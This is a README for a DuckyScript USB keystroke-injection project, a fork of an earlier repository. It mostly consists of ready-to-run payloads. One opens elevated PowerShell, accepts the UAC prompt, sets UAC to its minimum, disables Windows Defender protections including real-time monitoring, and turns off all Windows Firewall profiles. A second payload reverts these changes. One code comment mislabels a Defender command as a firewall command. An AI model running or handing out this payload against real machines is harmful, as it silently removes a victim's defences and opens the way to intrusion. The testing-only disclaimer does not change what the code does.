# DisableWinSecurity
DuckyScript-DisableWinSecurity is a fork based on the project by [yokokho](https://github.com/yokokho/Another-Rubber-Duck-Payloads). The purpose of this project is simply to add new features to the original project.

---

* [Preamble](#preamble)
* [Dependencies](#dependencies)
* [Development](#development)
  + [Disable_WinSecurity](#disable_winsecurity)
  + [Re-enable_WinSecurity](#re-enable_winsecurity)
* [Practical Applications](#practical-applications)
* [Limitations](#limitations)
* [Disclaimer](#disclaimer)

## Preamble

The original project contained a DuckyScript payload to disable all essential security measures on the target device, by reducing the level of security of the target device's User Account Control (UAC) settings to the minimum, disabling Automatic Sample Submission and Virus and Threat Protection in Windows Defender, and disabling Windows Firewall. All of these actions are made possible by instructing the DuckyScript payload to use Windows PowerShell.

Judging by the methodology of the original payload, we can deduce that it is possible for the end user to undo the changes made by the aforementioned payload by utilizing Windows PowerShell as well. In order to do so, we will need to create a second payload, which will focus on restoring the default settings for the target device's User Account Control (UAC) settings, Windows Defender and Windows Firewall.

## Dependencies

These payloads work on target devices that are running on Windows 10 operating system or newer only. No Internet connection required.

## Development

Both DuckyScript payloads require Windows PowerShell to make changes within the target device. To launch the application, we can input these lines into our payloads, as follows:

```
DEFAULTDELAY 1000
WINDOWS r
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 2000
ALT y
```

### Disable_WinSecurity

```
REM Disable Windows UAC
STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
ENTER
REM Disable Automatic Sample Submission, then Virus and Threat Protection in Windows Defender
STRING Set-MpPreference -DisableBlockAtFirstSeen $true
ENTER
STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
ENTER
REM Disable Windows Firewall
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
ENTER
STRING exit
ENTER
```

### Re-enable_WinSecurity
```
REM Restore Windows UAC to Its Original Value
STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 5
ENTER
REM Re-enable Windows Firewall
STRING Set-MpPreference -DisableRealtimeMonitoring $false
ENTER
STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
ENTER
REM Re-enable Virus and Threat Protection, then Automatic Sample Submission in Windows Defender
STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 0 -PropertyType DWORD -Force
ENTER
STRING Set-MpPreference -DisableBlockAtFirstSeen $false
ENTER
STRING exit
ENTER
```

## Practical Applications

## Limitations

Performance on older, lower-spec target devices may be an issue, as there are instances during testing where the executed payload works too fast for the target device to register even after implementing the DELAY command in the payload itself. For example, if the target device is too slow to launch Windows PowerShell, the payload would continue to type in all its premade commands after its DELAY timer is up. While this issue is highly improbable to occur for most PCs with newer hardware, it may disrupt penetration testing for those who tried to perform it on older devices.

The easiest workaround for this issue is for the user to increase the DELAY value when launching Windows PowerShell. Currently, the default value for the DELAY command in our DuckyScript payloads is 1000 — the units being in milliseconds (ms). Increasing the DELAY value to 5000 (equivalent to five seconds) should allow older systems to react accordingly to the injected keystrokes. If the latency issue persists, the user would need to keep increasing the DELAY value until the payloads run properly.

## Disclaimer

This project is intended to be used for testing, training, and educational purposes only.  
Never use it to do harm or create damage!  
